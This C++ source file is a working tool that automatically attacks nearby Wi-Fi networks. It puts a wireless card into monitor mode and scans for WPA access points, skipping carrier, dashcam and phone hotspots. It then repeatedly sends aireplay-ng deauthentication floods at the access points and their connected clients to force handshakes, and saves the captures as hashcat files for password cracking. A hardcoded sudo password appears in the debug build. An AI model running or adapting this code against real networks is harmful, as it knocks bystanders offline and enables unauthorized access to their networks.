// airmonitor.cpp : Defines the entry point for the console application.
//

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <sys/wait.h>
#include <string>
#include <sys/stat.h> 
#include <list>
#include <atomic>
#include <thread>
#include <mutex>
#include <memory>

#ifdef _DEBUG
#define SUDO "echo \"51211314\" | sudo -S sh -c "
#define STDOUTERR_OFF ""
#define STDERR_OFF ""
#else
#define SUDO ""
#define STDOUTERR_OFF "2>/dev/null 1>&2"
#define STDERR_OFF "2>/dev/null"
#endif

#define CAPTURE_DIR "./capture"
#define SEARCH_DURATION 20
#define DEAUTH_ATTACK_TIMES 5
#define DEAUTH_ATTACK_INTERVAL 10
#define SEC_TO_MS(sec) (sec * 1000000)

char interface[32] = { 0 };

struct StationData
{
	char  mac[18] = { 0 };
	int   power = -1;
	char  bssid[18] = { 0 };

	bool operator < (const StationData& rhs) const { return power > rhs.power; }
};

struct APData
{
	char  bssid[18] = { 0 };
	int   channel = 0;
	int   power = -1;
	char  essid[33] = { 0 };
	std::list<StationData> stations;

	bool operator < (const APData& rhs) const { return channel == rhs.channel ? power > rhs.power : channel > rhs.channel; }
};

struct AirCrack
{
	std::thread handshaked_thread;
	std::thread deauthattack_thread;
	std::mutex stations_mutex;
	std::atomic<bool> running = ATOMIC_VAR_INIT(true);
	std::atomic<bool> handshaked = ATOMIC_VAR_INIT(false);
	char workpath[18] = { 0 };

	AirCrack(APData& ap);
	~AirCrack();
};

void clear();
std::list<APData> get_ap_from_csv(char* csv);
std::list<StationData> get_stations_from_csv(char* csv);

void skip(char*& offset, char*& end, int length)
{
	if (offset + length < end)
	{
		char* find = strchr(offset, ',');
		if (find)
			offset = find + 2;
	}
}

int main()
{
    char cmd[512] = { 0 };

	clear();

    // find interface
	FILE* iwconfig = popen("iwconfig", "r");
	if (iwconfig)
	{
        while (fgets(cmd, sizeof(cmd), iwconfig) != NULL)
        {
            char* offset = strstr(cmd, "IEEE 802.11");
            if (offset)
            {
				if (strstr(cmd, "wlx") || strstr(cmd, "wlan"))
				{
					int length = offset - cmd - 2;
					memcpy(interface, cmd, length);
					interface[length] = 0;
					break;
				}
            }
        }
        pclose(iwconfig);
	}

	// wlan interface exist
    if (*interface)
    {
		bool monitor_mode_enabled = false;
		// switch to monitor mode
		sprintf(cmd, SUDO"\"rfkill unblock 0 && airmon-ng check kill && airmon-ng start %s\" %s", interface, STDOUTERR_OFF);
		system(cmd);

		// check monitor mode is enabled
		FILE* iwconfig = popen("iwconfig", "r");
		if (iwconfig)
		{
			while (fgets(cmd, sizeof(cmd), iwconfig) != NULL)
			{
				char* offset = strstr(cmd, "IEEE 802.11  Mode:Monitor");
				if (offset)
				{
					int length = offset - cmd - 2;
					memcpy(interface, cmd, length);
					interface[length] = 0;
					monitor_mode_enabled = true;
					break;
				}
			}
			pclose(iwconfig);
		}

		if (monitor_mode_enabled)
		{
			// searching bssid
			std::atomic<bool> running(true);
			std::thread airodump_thread([=, &running]()
			{
				char elapsed_time[32] = { 0 };
				sprintf(elapsed_time, "%d", SEARCH_DURATION);

				char dumpcmd[1024] = { 0 };
				sprintf(dumpcmd, SUDO"\"airodump-ng %s -a -u 1 -I 1 --ignore-negative-one -o csv -w ./%s/ap\" 2>&1", 
					interface, CAPTURE_DIR);
				FILE* airodump = popen(dumpcmd, "r");
				if (airodump)
				{
					while (running)
					{
						fgets(dumpcmd, sizeof(dumpcmd), airodump);
						char* elapsed_begin = strstr(dumpcmd, "Elapsed: ");
						if (elapsed_begin)
						{
							char* elapsed_end = strchr(elapsed_begin + 9, ' ');
							char tmp[16] = { 0 };
							memcpy(tmp, elapsed_begin + 9, elapsed_end - elapsed_begin - 9);
							int elapsed_time = atoi(tmp);
							if (elapsed_time > SEARCH_DURATION)
							{
								running = false;
								break;
							}
						}

					}
					pclose(airodump);
				}
				return 0;
			});

			for (int n = 0; running && n < SEARCH_DURATION * 5; ++n)
				usleep(SEC_TO_MS(1));
			running = false;
			if (airodump_thread.joinable())
				airodump_thread.join();
		}
    }

	// analyse csv file
	char* csv = 0;
	FILE* fp = fopen(CAPTURE_DIR"/ap-01.csv", "rt");
	if (fp)
	{
		// read csv into memory
		fseek(fp, 0, SEEK_END);
		long length = ftell(fp);
		if (length > 0)
		{
			csv = new char[length + 1];
			csv[length] = 0;
			fseek(fp, 0, SEEK_SET);
			fread(csv, length, 1, fp);
		}
		fclose(fp);
	}

	// check csv is valid
	std::list<APData> ap_set;
	if (csv)
	{
		ap_set = get_ap_from_csv(csv);
		auto station_set = get_stations_from_csv(csv);
		delete[] csv;

		// add station mac to its own ap
		for (auto& station : station_set)
		{
			for (auto& ap : ap_set)
			{
				if (strcmp(ap.bssid, station.bssid) == 0)
				{
					ap.stations.push_back(station);
					break;
				}
			}
		}
	}

	#ifdef _DEBUG
	// write to file for debug
	if (!ap_set.empty())
	{
		FILE* fp;
		fp = fopen(CAPTURE_DIR"/ap.txt", "wt");
		if (fp)
		{
			for (auto& ap : ap_set)
			{
				fprintf(fp, "ap -    bssid: %s, power: %3d, channel: %2d, essid: %s\n", ap.bssid, ap.power, ap.channel, ap.essid);
				for (auto& station : ap.stations)
				{
					fprintf(fp, "station - mac: %s, power: %3d\n", station.mac, station.power);
				}
			}
			fclose(fp);
		}
	}
	#endif

	if (!ap_set.empty())
	{
		int channel = ap_set.front().channel;
		// waiting to capture handbag of aps
		{
			std::list<std::unique_ptr<AirCrack>> crack_set;
			for (auto& ap : ap_set)
			{
				if (channel == ap.channel)
				{
					crack_set.push_back(std::make_unique<AirCrack>(ap));
				}
				else
				{
					channel = ap.channel;
					crack_set.clear();
				}
			}
		}
	}
 
	clear();
	sprintf(cmd, SUDO"\"airmon-ng stop %s\" %s", interface, STDOUTERR_OFF);
	system(cmd);
	sprintf(cmd, SUDO"\"service network-manager start\" %s", STDERR_OFF);
	system(cmd);

    return 0;
}

void clear()
{
	// remove csv/cap files for next airodump operation
    char cmd[128] = { 0 };
	sprintf(cmd, "mkdir %s 2>/dev/null", CAPTURE_DIR);
	system(cmd);
	sprintf(cmd, "rm -f %s/ap-*.* >/dev/null", CAPTURE_DIR);
	system(cmd);
}

std::list<APData> get_ap_from_csv(char* csv)
{
	// find bssid
	std::list<APData> ap_set;
	char* bss_begin = strstr(csv, "BSSID,");
	if (bss_begin)
	{
		char* station_begin = strstr(bss_begin, "Station MAC,");
		char* bss_end = station_begin ? station_begin - 2 : strrchr(csv, '\n');
		char* offset = strstr(bss_begin, ", Key\r\n");
		if (offset)
		{
			offset += 7; // strlen(", Key\r\n");

			while (offset < bss_end)
			{
				APData ap;
				// BSSID
				if (offset + sizeof(APData::bssid) < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(APData::bssid))
							memcpy(ap.bssid, offset, find - offset);
						offset = find + 2;
					}
				}

				// First time seen (skipped)
				skip(offset, bss_end, 20);

				// Last time seen (skipped)
				skip(offset, bss_end, 20);

				// Channel
				if (offset + 3 < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (find - offset < 3)
						{
							char ch[3] = { 0 };
							memcpy(ch, offset, find - offset);
							ap.channel = atoi(ch);
						}
						offset = find + 2;
					}
				}

				// Speed (skipped)
				skip(offset, bss_end, 3);

				// Privacy
				char privacy[9] = { 0 };
				if (offset + sizeof(privacy) < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(privacy))
							memcpy(privacy, offset, find - offset);
						offset = find + 2;
					}
				}

				// Cipher (skipped)
				skip(offset, bss_end, 9);

				// Authentication (skipped)
				skip(offset, bss_end, 3);

				// Power
				if (offset + 4 < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (find - offset < 4)
						{
							char pwr[4] = { 0 };
							memcpy(pwr, offset, find - offset);
							ap.power = atoi(pwr);
						}
						offset = find + 2;
					}
				}

				// Beacons (skipped)
				skip(offset, bss_end, 4);

				// IV (skipped)
				skip(offset, bss_end, 3);

				// LAN IP (skipped)
				skip(offset, bss_end, 17);

				// ID-length (skipped)
				skip(offset, bss_end, 2);

				// ESSID
				if (offset + sizeof(APData::essid) < bss_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(APData::essid))
							memcpy(ap.essid, offset, find - offset);
						offset = find + 2;
					}
				}

				// Key
				if (offset < bss_end)
				{
					char* find = strchr(offset, '\n');
					if (find)
						offset = find + 1;
				}

				// check data is valid
				if (strstr(privacy, "WPA") && (-80 < ap.power && ap.power < -1) &&  ap.essid[0] &&
					// telecommunications operators
					!strstr(ap.essid, "CMCC") && !strstr(ap.essid, "and-Business") && !strstr(ap.essid, "ChinaNet") &&
					// tachograph
					!strstr(ap.essid, "HZTY") && !strstr(ap.essid, "DVR") && !strstr(ap.essid, "CarCam") && !strstr(ap.essid, "CAR") && 
					!strstr(ap.essid, "DV") && !strstr(ap.essid, "NISSAN") && !strstr(ap.essid, "Volvo") && !strstr(ap.essid, "LLD") && 
					!strstr(ap.essid, "SGM") && !strstr(ap.essid, "vYou_") && !strstr(ap.essid, "IOV") && !strstr(ap.essid, "golo") &&
					!strstr(ap.essid, "mini3_Pro") && !strstr(ap.essid, "70mai_d01") && !strstr(ap.essid, "HZA50") && !strstr(ap.essid, "SUNLINK") &&
					// phone
					!strstr(ap.essid, "iPhone") && !strstr(ap.essid, "vivo") && !strstr(ap.essid, "ZTE") && !strstr(ap.essid, "Honor"))
				{
					ap_set.emplace_back(ap);
				}
			}

			// sort by power
			ap_set.sort();
		}
	}

	return ap_set;
}

std::list<StationData> get_stations_from_csv(char* csv)
{
	std::list<StationData> station_set;
	// find station
	char* station_begin = csv ? strstr(csv, "Station MAC,") : 0;
	if (station_begin)
	{
		char* station_end = strrchr(csv, '\r');
		char* offset = strstr(station_begin, ", Probed ESSIDs");
		if (offset)
		{
			offset += 17; // strlen(", Probed ESSIDs\r\n");

			while (offset < station_end)
			{
				StationData station;
				// Station MAC
				if (offset + sizeof(StationData::mac) < station_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(StationData::mac))
							memcpy(station.mac, offset, find - offset);
						offset = find + 2;
					}
				}

				// First time seen (skipped)
				skip(offset, station_end, 20);

				// Last time seen (skipped)
				skip(offset, station_end, 20);

				// Power
				if (offset + 4 < station_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (find - offset < 4)
						{
							char pwr[4] = { 0 };
							memcpy(pwr, offset, find - offset);
							station.power = atoi(pwr);
						}
						offset = find + 2;
					}
				}

				// packets
				skip(offset, station_end, 20);

				// BSSID
				if (offset + sizeof(StationData::bssid) < station_end)
				{
					char* find = strchr(offset, ',');
					if (find)
					{
						if (size_t(find - offset) < sizeof(StationData::bssid))
							memcpy(station.bssid, offset, find - offset);
						offset = find + 1;
					}
				}

				// Probed ESSIDs
				if (offset < station_end)
				{
					char* find = strchr(offset, '\n');
					if (find)
						offset = find + 1;
				}

				// check data is valid
				if (station.mac && (-80 < station.power && station.power < -1))
				{
					station_set.emplace_back(station);
				}
			}
			station_set.sort();
		}
	}

	return station_set;
}

AirCrack::AirCrack(APData& ap)
{
	char* p = workpath;
	memcpy(workpath, ap.bssid, sizeof(workpath));
	while (p = strchr(p, ':')) *p = '-';

	char cmd[128] = { 0 };
	sprintf(cmd, "%s/%s", CAPTURE_DIR, workpath);
	mkdir(cmd, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);

	handshaked_thread = std::thread([this, &ap](){
		char cmd[1024] = { 0 };

		// monitoring wireless router with bssid
		sprintf(cmd, SUDO"\"airodump-ng %s -w ./%s/%s/ -c %d --bssid %s -u 1 -I 1 -o cap,csv\" 2>&1", 
			interface, CAPTURE_DIR, workpath, ap.channel, ap.bssid);
		FILE* airodump = popen(cmd, "r");
		if (airodump)
		{
			auto check_csv_interval = time(NULL);
			while(running)
			{
				//fread(cmd, sizeof(cmd), 1, airodump);
				fgets(cmd, sizeof(cmd), airodump);
				if (strstr(cmd, "handshake:"))
					handshaked = true;

				if (!handshaked)
				{
					if (ap.stations.empty() &&
						time(NULL) - check_csv_interval > 1)
					{
						check_csv_interval = time(NULL);
						// analyse csv file
						char* csv = 0;
						sprintf(cmd, "%s/%s/-01.csv", CAPTURE_DIR, workpath);
						FILE* fp = fopen(cmd, "rt");
						if (fp)
						{
							// read csv into memory
							fseek(fp, 0, SEEK_END);
							long length = ftell(fp);
							if (length > 0)
							{
								csv = new char[length + 1];
								csv[length] = 0;
								fseek(fp, 0, SEEK_SET);
								fread(csv, length, 1, fp);
							}
							fclose(fp);
						}

						if (csv)
						{
							auto stations = get_stations_from_csv(csv);
							delete[] csv;
							if(!stations.empty())
							{
								stations_mutex.lock();
								ap.stations.swap(stations);
								stations_mutex.unlock();
							}
						}
					}
				}
			}
			pclose(airodump);
		}
	});

	deauthattack_thread = std::thread([this, &ap](){
		char cmd[256] = { 0 };
		for (int n = 0; !handshaked && n < DEAUTH_ATTACK_TIMES; ++n)
		{
			// sending deauth attack to ap
			sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s %s\" %s", ap.bssid, interface, STDOUTERR_OFF);
			system(cmd);

			// Let the bullet fly for a while
			usleep(SEC_TO_MS(DEAUTH_ATTACK_INTERVAL));

			stations_mutex.lock();
			auto stations = ap.stations;
			stations_mutex.unlock();

			// sending deauth attack to station
			if (!stations.empty())
			{
				for (auto& station : stations)
				{
					if (-80 < station.power && station.power < -1)
					{
						sprintf(cmd, SUDO"\"aireplay-ng -0 3 -a %s -c %s %s\" %s", ap.bssid, station.mac, interface, STDOUTERR_OFF);
						system(cmd);
					}
				}

				// Let the bullet fly for a while
				usleep(SEC_TO_MS(DEAUTH_ATTACK_INTERVAL));
			}
		}
		running = false;
		if (handshaked_thread.joinable())
			handshaked_thread.join();

		if (handshaked)
		{
			sprintf(cmd, "aircrack-ng %s/%s/-01.cap -j %s/%s_%s %s", CAPTURE_DIR, workpath, CAPTURE_DIR, ap.essid, workpath, STDERR_OFF);
			system(cmd);
		}
	});
}

AirCrack::~AirCrack()
{
	deauthattack_thread.join();

	char cmd[128] = { 0 };
	sprintf(cmd, "rm -fr %s/%s >/dev/null", CAPTURE_DIR, workpath);
	system(cmd);
}
